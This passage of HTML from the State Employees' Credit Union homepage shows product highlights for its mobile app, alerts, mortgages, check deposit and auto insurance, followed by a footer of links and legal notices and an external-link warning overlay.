                            <path d="M 73.07 110.57 A 3.07 3.07 0 0 1 70 113.64 A 3.07 3.07 0 0 1 66.93 110.57 A 3.07 3.07 0 0 1 70 107.5 A 3.07 3.07 0 0 1 73.07 110.57 Z" class="cls-1"></path>
                            <polygon class="cls-1" points="86 69.27 83.16 66.43 72 77.61 72 53.27 68 53.27 68 77.61 56.82 66.45 54 69.27 70 85.27 86 69.27" />
                            <path class="cls-1" d="M77.93,28.18H62.07a1.5,1.5,0,0,0,0,3H77.93a1.5,1.5,0,0,0,0-3Z" />
                        </svg>
                    </a>
                    <div class="highlights-title">SECU Mobile App</div>
                    <p class="highlights-description">The app provides even more convenient access to the products and services you already use from virtually anywhere.</p>
                    <p><a class="btn btn-default highlights-button highlights-button-wider" href="https://www.ncsecu.org/MobileServices/MobileApp.html" role="button" target="_top">Download the Mobile App</a></p>
                </div>
                <!-- /.col-sm-4 -->
                <div class="col-sm-4">
                    <a href="https://www.ncsecu.org/MobileServices/Alerts.html" target="_top" class="home-vector-link">
                        <!-- for ADA remember to set link text as well -->
                        Stay in the Know <svg version="1.1" id="online-security-vector" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 140 140" enable-background="new 0 0 140 140" xml:space="preserve">
                            <title>Stay in the Know</title>
                            <circle cx="70" cy="70" r="70" />
                            <path d="M70,140a70,70,0,1,1,70-70A70.08,70.08,0,0,1,70,140ZM70,2a68,68,0,1,0,68,68A68.07,68.07,0,0,0,70,2Z" />
                            <path d="M81.4,31.7l-0.9,2.9c12.7,4,21.2,15.6,21,28.9l3,0C104.6,48.9,95.3,36.1,81.4,31.7z" />
                            <path d="M84.9,19.1L84,21.9c18.1,5.7,30.2,22.2,30.2,41.2l3,0C117.2,42.9,104.2,25.2,84.9,19.1z" />
                            <path d="M92.3,83V70.4C92.3,59.3,86,49,76,44c-2.2-5.6-7.5-9-13.2-9c-1.7,0-3.5,0.3-5.2,1c-3.7,1.4-6.6,4.3-8,8
                                c-10,5-16.4,15.2-16.4,26.4V83l-8,7.2c-0.6,0.6-1,1.4-1,2.2v9.8c0,1.7,1.4,3.1,3,3.1c0,0,0,0,0,0h17.4h1.8
                                c1.1,8.2,8.1,14.2,16.2,14.2c0.7,0,1.5,0,2.2-0.1c7.3-1,13.1-6.7,14-14h2.7h16.4c1.7,0,3.1-1.4,3.1-3.1c0,0,0,0,0,0v-9.9
                                c0-0.9-0.4-1.7-1-2.2L92.3,83z M64.5,116.4c-0.6,0.1-1.2,0.1-1.8,0.1c-6.5,0-12.1-4.8-13.1-11.2h26.3
                                C74.9,111.1,70.3,115.6,64.5,116.4z M98.1,102.3C98.1,102.3,98.1,102.4,98.1,102.3l-16.5,0.1h-2.7h-2.6H49.1h-2.6h-1.8H27.3
                                c0,0-0.1,0-0.1-0.1l0-9.8l8-7.2l1-0.9V83V70.4c0-10.1,5.7-19.2,14.7-23.8l1-0.5l0.4-1.1c1.1-2.9,3.4-5.2,6.3-6.3
                                c1.3-0.5,2.7-0.8,4.1-0.8c4.6,0,8.7,2.8,10.4,7.1l0.4,1.1l1,0.5c9,4.5,14.7,13.7,14.7,23.8V83v1.3l1,0.9l7.9,7.2V102.3z" />
                        </svg>
                    </a>
                    <div class="highlights-title">Stay in the Know</div>
                    <p class="highlights-description">Stay up-to-date on account activity with text or secure message alert notifications. Sign up in Member Access.</p>
                    <p><a class="btn btn-default highlights-button highlights-button-wider" href="https://www.ncsecu.org/MobileServices/Alerts.html" target="_top" role="button">Learn More About Alerts</a></p>
                </div>
                <!-- /.col-sm-4 -->
                <div class="col-sm-4">
                    <a href="https://www.ncsecu.org/Home/Covid-19-Resources.html" target="_top" class="home-vector-link">
                        <!-- for ADA remember to set link text as well -->
                        COVID-19 Resources <svg version="1.1" id="covid-19-resources-vector" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 140 140" enable-background="new 0 0 140 140" xml:space="preserve">
                            <title>COVID-19 Resources</title>
                            <circle cx="70" cy="70" r="70" />
                            <path d="M70,140a70,70,0,1,1,70-70A70.08,70.08,0,0,1,70,140ZM70,2a68,68,0,1,0,68,68A68.07,68.07,0,0,0,70,2Z" />
                            <path d="M72.7,19.8c1.8,1.1,2.9,3,2.8,5.1c0.1,2.5-1.6,4.7-3.9,5.4V38c7.2,0.5,14,3.5,19.3,8.5
				l7.7-7.5c-0.5-0.9-0.8-1.9-0.8-2.9c0-2.3,1.4-4.4,3.5-5.3c2.1-0.9,4.6-0.4,6.2,1.2c1.6,1.6,2.1,4.1,1.2,6.2
				c-0.9,2.1-3,3.5-5.3,3.5c-0.8,0-1.6-0.2-2.3-0.5L93.4,49c4.9,5.4,7.7,12.3,8,19.5h8.3c0.5-2.6,2.8-4.4,5.6-4.4
				c3.2,0,5.7,2.6,5.7,5.7c0,3.1-2.6,5.4-5.7,5.4c-2.3,0-4.4-1.4-5.2-3.6h-8.7c-0.3,7.5-3.4,14.2-8,19.5l7.9,7.7
				c0.8-0.4,1.6-0.6,2.5-0.7c2.3,0,4.4,1.4,5.3,3.5c0.9,2.1,0.4,4.6-1.2,6.3c-1.6,1.6-4.1,2.1-6.2,1.2c-2.1-0.9-3.5-3-3.5-5.3
				c0-1,0.3-1.9,0.8-2.8l-7.7-7.7c-5.5,5-12.5,7.9-19.8,8.4v8c2.4,0.7,4.1,2.9,4.1,5.4c0.1,2.1-1,4-2.8,5.1c-1.8,1.1-4,1.1-5.8,0
				c-1.7-1-2.8-2.8-2.8-4.8l0-0.2c-0.1-2.5,1.6-4.8,4.1-5.4v-8c-7.4-0.4-14.4-3.2-19.8-8.2l-7.7,7.7c0.5,0.9,0.8,1.9,0.8,2.9
				c0,2.3-1.4,4.4-3.5,5.3c-2.1,0.9-4.6,0.4-6.2-1.2c-1.6-1.6-2.1-4.1-1.2-6.2c0.9-2.1,3-3.5,5.3-3.5c0.9,0,1.7,0.2,2.5,0.7l7.9-7.7
				c-4.9-5.4-7.8-12.4-8.2-19.6h-7.5c-0.9,2.8-3.8,4.4-6.6,3.8s-4.8-3.3-4.4-6.2c0.3-2.9,2.8-5.1,5.7-5.1c2.6,0,4.7,1.8,5.6,4.3h7.5
				c0.3-7.5,3.4-14.2,8.2-19.7l-7.4-7.2c-0.8,0.4-1.6,0.5-2.5,0.5c-2.3,0-4.4-1.4-5.3-3.5s-0.4-4.6,1.2-6.2c1.6-1.6,4.1-2.1,6.2-1.2
				c2.1,0.9,3.5,3,3.5,5.3c0,1-0.3,2.1-0.8,2.9l7.2,7c5.5-5,12.5-7.9,19.8-8.4v-7.7c-2.4-0.7-4.1-2.9-4.1-5.4c-0.1-2.1,1-4,2.8-5.1
				C68.7,18.7,71,18.7,72.7,19.8z M69.7,112.7c-1.3,0-2.4,1.1-2.5,2.5c0,1.4,1.1,2.5,2.5,2.5c1.4,0,2.5-1.1,2.5-2.5
				S71,112.7,69.7,112.7z M35.6,101.7c-1.4,0-2.5,1.1-2.5,2.5s1.1,2.5,2.5,2.5c1.4,0,2.5-1.1,2.5-2.5c0-0.7-0.2-1.3-0.7-1.8
				C36.9,101.9,36.3,101.7,35.6,101.7z M103.7,101.5c-1.4,0-2.5,1.1-2.5,2.5c0,0.7,0.2,1.3,0.7,1.8c0.5,0.5,1.1,0.7,1.7,0.7
				c1.4,0,2.5-1.1,2.5-2.5C106.2,102.6,105.1,101.5,103.7,101.5z M69.7,41.4C53.9,41.4,41,54.3,41,70.1s12.8,28.7,28.7,28.7
				c15.9,0,28.5-12.9,28.5-28.8C98.2,54.2,85.4,41.4,69.7,41.4z M85.6,78.5c2.1,0.9,3.5,3,3.5,5.3c0,3.2-2.6,5.7-5.7,5.7l0,0
				c-2.3,0-4.4-1.4-5.3-3.5c-0.9-2.1-0.4-4.6,1.2-6.3C81,78.1,83.5,77.6,85.6,78.5z M56.7,75.8c3.2,0,5.7,2.6,5.7,5.7
				c0,3.2-2.6,5.7-5.7,5.7v0c-3.2,0-5.7-2.6-5.7-5.7C51,78.4,53.6,75.8,56.7,75.8z M83.4,81.4c-1.4,0-2.5,1.1-2.5,2.5
				s1.1,2.5,2.5,2.5c1.4,0,2.5-1.1,2.5-2.5C85.8,82.5,84.8,81.4,83.4,81.4z M56.7,79.1c-1,0-1.9,0.6-2.3,1.5s-0.2,2,0.5,2.7
				c0.7,0.7,1.8,0.9,2.7,0.5c0.9-0.4,1.5-1.3,1.5-2.3c0-0.7-0.2-1.3-0.7-1.8C58,79.3,57.4,79.1,56.7,79.1z M69.7,61.7
				c4.5,0,8.2,3.7,8.2,8.2c-0.1,4.5-3.7,8.1-8.2,8.2c-4.5,0-8.2-3.7-8.2-8.2c0-2.2,0.8-4.3,2.4-5.8C65.4,62.5,67.5,61.7,69.7,61.7z
				 M69.7,65c-2.7,0-4.9,2.2-4.9,4.9s2.2,4.9,4.9,4.9c2.7,0,4.9-2.2,4.9-4.9C74.4,67.1,72.3,65,69.7,65z M24.8,67.3
				c-1,0-1.9,0.6-2.3,1.5s-0.2,2,0.5,2.7c0.7,0.7,1.8,0.9,2.7,0.5s1.5-1.3,1.5-2.3C27.2,68.4,26.2,67.3,24.8,67.3z M115.4,67.1
				c-1.4,0-2.5,1.1-2.5,2.5s1.1,2.5,2.5,2.5c1.4,0,2.5-1.1,2.5-2.5c0-0.7-0.2-1.3-0.7-1.8S116,67.1,115.4,67.1z M56.6,51.1
				c2.3,0,4.4,1.4,5.3,3.5c0.9,2.1,0.4,4.6-1.2,6.2c-1.6,1.6-4.1,2.1-6.2,1.2s-3.5-3-3.5-5.3C50.9,53.7,53.4,51.1,56.6,51.1z
				 M83.3,51.1c3.2,0,5.7,2.6,5.7,5.7c0,3.2-2.6,5.7-5.7,5.7c-3.2,0-5.7-2.6-5.7-5.7C77.6,53.7,80.1,51.1,83.3,51.1z M83.3,54.4
				c-1.4,0-2.5,1.1-2.5,2.5c0,0.7,0.2,1.3,0.7,1.8c0.5,0.5,1.1,0.7,1.8,0.7c1.4,0,2.5-1.1,2.5-2.5S84.6,54.4,83.3,54.4z M55.6,54.6
				c-0.9,0.4-1.5,1.3-1.5,2.3c0,0.7,0.2,1.3,0.7,1.8c0.5,0.5,1.1,0.7,1.8,0.7c1,0,1.9-0.6,2.3-1.5s0.2-2-0.5-2.7
				S56.6,54.2,55.6,54.6z M36.3,33.9c-1.4,0-2.5,1.1-2.5,2.5s1.1,2.5,2.5,2.5c1.4,0,2.5-1.1,2.5-2.5c0-0.7-0.2-1.3-0.7-1.8
				C37.6,34.1,36.9,33.9,36.3,33.9z M103.6,33.4c-1.4,0-2.5,1.1-2.5,2.5c0,0.7,0.2,1.3,0.7,1.8c0.5,0.5,1.1,0.7,1.7,0.7
				c1.4,0,2.5-1.1,2.5-2.5S104.9,33.4,103.6,33.4z M69.5,22.4c-1.4,0-2.5,1.1-2.5,2.5s1.1,2.5,2.5,2.5c0.7,0,1.3-0.2,1.8-0.7
				c0.5-0.5,0.7-1.1,0.7-1.8C72,23.5,70.9,22.4,69.5,22.4z" />
                        </svg>
                    </a>
                    <div class="highlights-title">COVID-19 Resources</div>
                    <p class="highlights-description">Find out how your Credit Union can offer you loan assistance, financial health tips and more during these times.</p>
                    <p><a class="btn btn-default highlights-button highlights-button-wider" href="https://www.ncsecu.org/Home/Covid-19-Resources.html" role="button" target="_top">See How SECU Can Help</a></p>
                </div>
                <!-- /.col-lg-4 -->
            </div>
            <!-- /.row -->

            <!-- START THE FEATURETTES -->
            <hr class="featurette-divider">

            <div class="row featurette">
                <div class="col-sm-7">
                    <div class="featurette-content-wrapper">
                        <div class="featurette-heading">Our Fixed-Rate Mortgages Give You Options</div>
                        <p class="featurette-lead">No private mortgage insurance (PMI). Choose from a variety of our fixed-rate loans!</p>
                        <!-- insert optional legal lines here within a <p class="featurette-legal"> element -->

                        <p class="featurette-link">
                            <a href="https://onlineaccess.ncsecu.org/O/selfservices/mortgageloanrequest.aspx">Apply Online Today &raquo;</a>
                        </p>
                    </div>
                </div>
                <div class="col-sm-5">
                    <img class="featurette-image img-responsive lazy" src="https://www.ncsecu.org/Images/MABoxMidW.png" data-original="Home/Images/fixed-rate-mortgage.jpg" alt="Excited family running into house.">
                </div>
            </div>

            <hr class="featurette-divider">

            <div class="row featurette">
                <div class="col-sm-7 col-sm-push-5">
                    <div class="featurette-content-wrapper">
                        <div class="featurette-heading">Deposit Checks Anytime, Anywhere</div>
                        <p class="featurette-lead">Skip the branch or ATM. With Mobile Check Deposit, you can deposit checks conveniently and securely right from your phone.</p>
                        <!-- insert optional legal lines here within a <p class="featurette-legal"> element -->

                        <p class="featurette-link">
                            <a href="https://www.ncsecu.org/MobileServices/MobileApp.html">Download Our App to Make a Deposit Today &raquo;</a>
                        </p>
                    </div>
                </div>
                <div class="col-sm-5 col-sm-pull-7">
                    <img class="featurette-image img-responsive lazy" src="https://www.ncsecu.org/Images/MABoxMidW.png" data-original="Home/Images/mobile-check-deposit.jpg" alt="Person holding cell phone taking picture of check.">
                </div>
            </div>

            <hr class="featurette-divider">

            <div class="row featurette">
                <div class="col-sm-7">
                    <div class="featurette-content-wrapper">
                        <div class="featurette-heading">Auto Insurance</div>
                        <p class="featurette-lead">Don’t overpay for auto insurance. Get preferred rates based on your length of Credit Union membership with loyalty credits provided by AAA Carolinas. Get a quote online today and start saving!</p>
                        <!-- insert optional legal lines here within a <p class="featurette-legal"> element -->

                        <p class="featurette-link">
                            <a href="https://www.ncsecu.org/Insurance/AutoHomeowners.html" target="_top">Get an Auto Insurance Quote &raquo;</a>
                        </p>
                    </div>
                </div>
                <div class="col-sm-5">
                    <img class="featurette-image img-responsive lazy" src="https://www.ncsecu.org/Images/MABoxMidW.png" data-original="Home/Images/auto-insurance.jpg" alt="Man getting out of car smiling.">
                </div>
            </div>

            <!--<hr class="featurette-divider">-->

            <!--<div class="row featurette">
                <div class="col-sm-7 col-sm-push-5">
                    <div class="featurette-content-wrapper">
                        <div class="featurette-heading">Early Direct Deposit</div>
                        <p class="featurette-lead">Want to get paid a day early? All SECU Checking, CashPoints® Global, Share and Money Market Share accounts are able to receive direct deposits up to a day early.</p>-->
                        <!-- insert optional legal lines here within a <p class="featurette-legal"> element:
                <p class="featurette-legal"></p> -->
                       <!-- <p class="featurette-link">
                            <a href="https://www.ncsecu.org/AutomatedServices/DirectDeposit.html " target="_top">More About Early Direct Deposit &raquo;</a>
                        </p>
                    </div>
                </div>
                <div class="col-sm-5 col-sm-pull-7">
                    <img class="featurette-image img-responsive lazy" src="https://www.ncsecu.org/Images/MABoxMidW.png" data-original="Home/Images/early-direct-deposit.jpg" alt="SECU’s Early Direct Deposit">
                </div>
            </div>-->



            <br>
            <br>
        </div>
    </div>
    <!-- InstanceEndEditable -->

        <!-- InstanceBeginEditable name="FooterLinks" -->
    <!-- InstanceEndEditable -->
    <!-- footer -->
    <footer>
        <div class="footer-content">
            <div class="row footer-row">
                <div class="col-sm-2">
                    <h6>Security Statement</h6>
                    <p class="footer-p"><em>SECU will not ask for personal information such as online credentials,
                            account numbers or card numbers via email, voice or text messaging.</em></p>
                    <a href="https://www.ncsecu.org/Security/SecurityOverview.html" target="_top">Online Security &raquo;</a>
                </div>
                <div class="col-sm-2">
                    <h6>Calculators</h6>
                    <p class="footer-p">
						<a href="https://www.ncsecu.org/Calcs/CheckbookBalancing.html" target="_top">Checkbook Balancing</a>
                        <a href="https://www.moneyguidepro.com/secu-anonymous/blocks/anonymous/Menu" role="button" rel="noopener" target="_blank" data-external-link="">Financial Planning</a>
						<a href="https://www.ncsecu.org/DepositAccounts/SummerCashCalc.html" target="_top">Summer Cash Calculator</a>
                        <a id="NewCarDirect" href="https://www.ncsecu.org/Calcs/MonthlyPayment.html">Vehicle Calculator</a>
                    </p>
                    <a href="https://www.ncsecu.org/OnlineServices/CalculatorList.html" target="_top">More Calculators &raquo;</a>
                </div>
                <div class="col-sm-2">
                    <h6>Publications</h6>
                    <p class="footer-p">
						<a href="https://www.ncsecu.org/AboutSECU/Brochures.html" target="_top">Account Disclosures</a>
						<a href="https://www.ncsecu.org/Publications/AnnualMeetingandReport.html" target="_top">Annual Meeting &amp; Report</a>
                        <a href="https://www.ncsecu.org/AboutSECU/Brochures.html" target="_top">Brochures</a>
                        <a href="https://www.ncsecu.org/Publications/Newsletters.html" target="_top">Newsletters</a>
                        <a href="https://www.ncsecu.org/Publications/PressReleases.html" target="_top">Press Releases</a>
                    </p>
                    <a href="https://www.ncsecu.org/Publications/Publications.html" target="_top">More Publications &raquo;</a>
                </div>
                <div class="col-sm-2 about-secu">
                    <h6>About SECU</h6>
                    <a href="https://www.ncsecu.org/AboutSECU/ABARoutingTransitNumber.html" target="_top">ABA Routing Number</a>
                    <a href="https://www.ncsecu.org/AboutSECU/Calendar.html" target="_top">Calendar</a>
                    <a href="https://www.ncsecu.org/AboutSECU/Careers.html" target="_top">Careers</a>
                    <a href="https://www.ncsecu.org/AboutSECU/CommunityInvolvement.html" target="_top">Community Involvement</a>
                    <a href="https://www.ncsecu.org/AboutSECU/CorporateInformation.html" target="_top">Corporate Information</a>
                    <a href="https://www.ncsecu.org/AboutSECU/MembershipEligibility.html" target="_top">Membership Eligibility</a>
                    <a href="https://www.ncsecu.org/AboutSECU/FinancialStatus.html" target="_top">SECU Financial Status</a>
                    <!-- mobile about secu -->
                    <a href="https://www.ncsecu.org/AboutSECU/Careers.html" class="mobile-about-secu">Careers</a>
                    <a href="https://www.ncsecu.org/Home/ContactUs.html" class="mobile-about-secu">Contact Us</a>
                    <a href="https://www.ncsecu.org/RatesAndFees/LendingRates.html" class="mobile-about-secu">Rates</a>
                    <a href="https://www.ncsecu.org/AboutSECU/ABARoutingTransitNumber.html" class="mobile-about-secu">Routing Number</a>
                    <a href="https://www.ncsecu.org/Sitemap.html" class="mobile-about-secu">Site Map</a>
                </div>
                <div class="col-sm-2">
                    <h6>Related Sites</h6>
                    <a href="https://www.cufatcats.org/" target="_blank">FAT CAT Youth</a>
                    <a href="https://www.nclifetimeincome.org/" target="_blank">NC Lifetime Income</a>
                    <a href="https://www.ncsecufoundation.org/" target="_blank">SECU Foundation</a>
                    <a href="https://www.teenzard.org/" target="_blank">Zard Teen</a>
                </div>
                <div class="col-sm-2 connect-with-secu-desktop">
                    <h6>Connect with SECU</h6>
                    <a href="https://www.facebook.com/stateemployeescreditunion" rel="noopener" target="_blank" data-external-link="" class="social-overlay">
                        Facebook Desktop <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 412 412.3" style="enable-background:new 0 0 412 412.3;" xml:space="preserve">
                            <title>Facebook Icon Desktop</title>
                            <path d="M208.4,354.8V233h-40.8v-48.4h40.8v-38.1c0-41.4,25.3-64,62.3-64c17.7,0,32.9,1.3,37.3,1.9v43.3h-25.6
					c-20.1,0-24,9.6-24,23.6v33.3h45.4l-6.2,48.4h-39.1v121.8" />
                            <path d="M346,6H66C32.9,6,6,32.9,6,66v280c0,33.1,26.9,60,60,60h280c33.1,0,60-26.9,60-60V66C406,32.9,379.1,6,346,6z M52.4,340.4
					V71.6c0-10.6,8.6-19.2,19.2-19.2h268.8c10.6,0,19.2,8.6,19.2,19.2v268.8c0,10.6-8.6,19.2-19.2,19.2H71.6
					C61,359.6,52.4,351,52.4,340.4z" />
                        </svg>
                    </a>
                    <a href="https://www.youtube.com/c/ncsecu_videos" rel="noopener" target="_blank" data-external-link="" class="social-overlay">
                        YouTube Desktop <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 528 412.3" style="enable-background:new 0 0 528 412.3;" xml:space="preserve">
                            <title>YouTube Icon Desktop</title>
                            <path d="M510.7,73.6C504.4,50,485.9,31.3,462.4,25C419.8,13.5,343,5.5,264,5.5S108.2,13.5,65.6,25c-23.5,6.3-42,24.9-48.3,48.6
					C5.9,116.5,5.9,205.9,5.9,205.9s0,0,0,0.1c0,0.1,0,0.1,0,0.1s0,89.4,11.4,132.3c6.3,23.7,24.8,42.3,48.3,48.6
					c42.6,11.5,119.4,19.5,198.4,19.5s155.8-8,198.4-19.5c23.5-6.3,42-24.9,48.3-48.6c11.4-42.9,11.4-132.3,11.4-132.3s0,0,0-0.1
					c0-0.1,0-0.1,0-0.1S522.1,116.5,510.7,73.6z M264,360.1c-74.3,0-143.1-7.5-179.9-17.4c-9.3-2.5-16.7-10-19.2-19.5
					c-7.9-29.7-9.7-94.7-9.7-117.1V206v-0.1c0-22.5,1.7-87.4,9.7-117.1c2.5-9.5,9.9-16.9,19.2-19.4c36.8-10,105.6-17.5,179.9-17.5
					s143.1,7.5,179.9,17.4c9.3,2.5,16.7,10,19.2,19.5c7.9,29.7,9.7,94.7,9.7,117.1v0.1v0.1c0,22.5-1.7,87.4-9.7,117.1
					c-2.5,9.5-9.9,16.9-19.2,19.4C407.1,352.6,338.3,360.1,264,360.1z" />
                            <path d="M202.4,293.6V118.4L356.3,206L202.4,293.6z" />
                        </svg>
                    </a>
                    <a href="https://instagram.com/secu_foundation/" rel="noopener" target="_blank" data-external-link="" class="social-overlay">
                        Instagram Desktop <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 412 412.3" style="enable-background:new 0 0 412 412.3;" xml:space="preserve">
                            <title>Instagram Icon Desktop</title>
                            <path d="M206,97.6C146,97.6,97.6,146,97.6,206S146,314.4,206,314.4S314.4,266,314.4,206S266.1,97.6,206,97.6z M206,276.5
					c-38.8,0-70.5-31.6-70.5-70.5s31.6-70.5,70.5-70.5s70.5,31.6,70.5,70.5S244.8,276.5,206,276.5L206,276.5z" />
                            <path d="M345,5H65C31.9,5,5,31.9,5,65v280c0,33.1,26.9,60,60,60h280c33.1,0,60-26.9,60-60V65C405,31.9,378.1,5,345,5z M51.4,339.4
					V70.6c0-10.6,8.6-19.2,19.2-19.2h268.8c10.6,0,19.2,8.6,19.2,19.2v268.8c0,10.6-8.6,19.2-19.2,19.2H70.6
					C60,358.6,51.4,350,51.4,339.4z" />
                            <circle cx="312.5" cy="99.5" r="26.3" />
                        </svg>
                    </a>
                </div>
            </div>

            <div class="legal-information-desktop">
                <a href="https://get.adobe.com/reader/" rel="noopener" target="_blank" data-external-link="" class="acrobat-reader">Download Acrobat Reader</a> |
				<a href="https://www.ncsecu.org/Home/AccessibilityStatement.html" target="_top">Accessibility</a> |
                <a href="https://www.ncsecu.org/Sitemap.html" target="_top">Site Map</a> |
                <a href="https://www.ncsecu.org/PDF/AboutSECU/PrivacyNotice.pdf" target="_blank">Privacy Notice</a> |
                <a href="https://www.ncsecu.org/Home/HomeMortgageDisclosureAct.html" target="_blank">HMDA</a> |
                <a href="https://www.ncsecu.org/Home/EqualHousingLender.html" target="_blank">Equal Housing Opportunity <img src="https://www.ncsecu.org/Home/Images/EqualHousingOpportunityHouseImage.png?ver=3.0" alt="Equal Housing"></a> |
                <a href="https://www.ncsecu.org/Mortgages/MLSRegistry.aspx" target="_top">NMLS#430055</a> |
                <a href="https://www.ncsecu.org/Home/Legal.html" target="_top">Legal</a> |
                <a href="https://www.ncsecu.org/Home/DepositInsurance.html" target="_top">Federally Insured by NCUA</a>
            </div>

            <div class="legal-information-mobile">
                <h6>Legal Information</h6>
				<a href="https://www.ncsecu.org/Home/AccessibilityStatement.html" target="_top">Accessibility</a>
                <a href="https://get.adobe.com/reader/" rel="noopener" target="_blank" data-external-link="" class="acrobat-reader">Download Acrobat Reader</a>
                <a href="https://www.ncsecu.org/Home/EqualHousingLender.html" target="_blank">Equal Housing Opportunity <img src="https://www.ncsecu.org/Home/Images/EqualHousingOpportunityHouseImage.png?ver=3.0" alt="Equal Housing"></a>
                <a href="https://www.ncsecu.org/Mortgages/MLSRegistry.aspx" target="_top">NMLS#430055</a>
                <a href="https://www.ncsecu.org/Home/DepositInsurance.html" target="_top">Federally Insured by NCUA</a>
                <a href="https://www.ncsecu.org/Home/HomeMortgageDisclosureAct.html" target="_blank">HMDA</a>
                <a href="https://www.ncsecu.org/Home/Legal.html" target="_top">Legal</a>
                <a href="https://www.ncsecu.org/PDF/AboutSECU/PrivacyNotice.pdf" target="_blank">Privacy Notice</a>
            </div>

            <div class="connect-with-secu-mobile">
                <h6>Connect with SECU</h6>
                <a href="https://www.facebook.com/stateemployeescreditunion" rel="noopener" target="_blank" data-external-link="" class="social-overlay">
                    Facebook Mobile <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 412 412.3" style="enable-background:new 0 0 412 412.3;" xml:space="preserve">
                        <title>Facebook Icon Mobile</title>
                        <path d="M208.4,354.8V233h-40.8v-48.4h40.8v-38.1c0-41.4,25.3-64,62.3-64c17.7,0,32.9,1.3,37.3,1.9v43.3h-25.6
					c-20.1,0-24,9.6-24,23.6v33.3h45.4l-6.2,48.4h-39.1v121.8" />
                        <path d="M346,6H66C32.9,6,6,32.9,6,66v280c0,33.1,26.9,60,60,60h280c33.1,0,60-26.9,60-60V66C406,32.9,379.1,6,346,6z M52.4,340.4
					V71.6c0-10.6,8.6-19.2,19.2-19.2h268.8c10.6,0,19.2,8.6,19.2,19.2v268.8c0,10.6-8.6,19.2-19.2,19.2H71.6
					C61,359.6,52.4,351,52.4,340.4z" />
                    </svg>
                </a>
                <a href="https://www.youtube.com/c/ncsecu_videos" rel="noopener" target="_blank" data-external-link="" class="social-overlay">
                    YouTube Mobile <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 528 412.3" style="enable-background:new 0 0 528 412.3;" xml:space="preserve">
                        <title>YouTube Icon Mobile</title>
                        <path d="M510.7,73.6C504.4,50,485.9,31.3,462.4,25C419.8,13.5,343,5.5,264,5.5S108.2,13.5,65.6,25c-23.5,6.3-42,24.9-48.3,48.6
					C5.9,116.5,5.9,205.9,5.9,205.9s0,0,0,0.1c0,0.1,0,0.1,0,0.1s0,89.4,11.4,132.3c6.3,23.7,24.8,42.3,48.3,48.6
					c42.6,11.5,119.4,19.5,198.4,19.5s155.8-8,198.4-19.5c23.5-6.3,42-24.9,48.3-48.6c11.4-42.9,11.4-132.3,11.4-132.3s0,0,0-0.1
					c0-0.1,0-0.1,0-0.1S522.1,116.5,510.7,73.6z M264,360.1c-74.3,0-143.1-7.5-179.9-17.4c-9.3-2.5-16.7-10-19.2-19.5
					c-7.9-29.7-9.7-94.7-9.7-117.1V206v-0.1c0-22.5,1.7-87.4,9.7-117.1c2.5-9.5,9.9-16.9,19.2-19.4c36.8-10,105.6-17.5,179.9-17.5
					s143.1,7.5,179.9,17.4c9.3,2.5,16.7,10,19.2,19.5c7.9,29.7,9.7,94.7,9.7,117.1v0.1v0.1c0,22.5-1.7,87.4-9.7,117.1
					c-2.5,9.5-9.9,16.9-19.2,19.4C407.1,352.6,338.3,360.1,264,360.1z" />
                        <path d="M202.4,293.6V118.4L356.3,206L202.4,293.6z" />
                    </svg>
                </a>
                <a href="https://instagram.com/secu_foundation/" rel="noopener" target="_blank" data-external-link="" class="social-overlay">
                    Instagram Mobile <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 412 412.3" style="enable-background:new 0 0 412 412.3;" xml:space="preserve">
                        <title>Instagram Icon Mobile</title>
                        <path d="M206,97.6C146,97.6,97.6,146,97.6,206S146,314.4,206,314.4S314.4,266,314.4,206S266.1,97.6,206,97.6z M206,276.5
					c-38.8,0-70.5-31.6-70.5-70.5s31.6-70.5,70.5-70.5s70.5,31.6,70.5,70.5S244.8,276.5,206,276.5L206,276.5z" />
                        <path d="M345,5H65C31.9,5,5,31.9,5,65v280c0,33.1,26.9,60,60,60h280c33.1,0,60-26.9,60-60V65C405,31.9,378.1,5,345,5z M51.4,339.4
					V70.6c0-10.6,8.6-19.2,19.2-19.2h268.8c10.6,0,19.2,8.6,19.2,19.2v268.8c0,10.6-8.6,19.2-19.2,19.2H70.6
					C60,358.6,51.4,350,51.4,339.4z" />
                        <circle cx="312.5" cy="99.5" r="26.3" />
                    </svg>
                </a>
            </div>


            <p class="secu-copyright">&copy;<script type="text/javascript">
                    var date = new Date();
                    document.write(date.getFullYear());
                </script> State Employees' Credit Union</p>
        </div>
    </footer>
    <!-- external speedbump -->
    <div id="external-speedbump" role="complementary" aria-label="Redirect Pages Overlay">
        <div class="container interior-content redirect-pages">
            <div class="row">
                <div class="col-sm-12">
                      <div class="redirect-pages-box" id="overlaySocial">
                            Please be advised that State Employees' Credit Union is only responsible for the content we post to our social media sites. For more detailed information, please review our <a href="https://www.ncsecu.org/PDF/AboutSECU/SECU-Terms-of-Use.pdf" target="_blank">Terms of Use: Website and Social Media Accounts</a>.
		              </div> 
                      <div class="redirect-pages-box">
                            You are now leaving the Credit Union website. The website you are entering is not affiliated with or controlled by the Credit Union and may have different terms, conditions and privacy and security policies than the Credit Union. The Credit Union does not provide, guarantee, endorse, or assume responsibility for any content, products or services that may be provided by the website you are entering. If you decide to access this website, you do so entirely at your own risk and subject to the terms and conditions of use on such website.
		              </div>
                      <a href="https://www.ncsecu.org/#" id="remain-in-domain" target="_top" class="no-underline">&laquo; Return to www.ncsecu.org</a>
                      <a href="https://www.ncsecu.org/#" id="redirect-button" class="button highlights-button highlights-button-inline no-underline" target="_top">Continue to Alternate Site</a>
                </div>
            </div>
        </div>
    </div>
    <!-- js -->
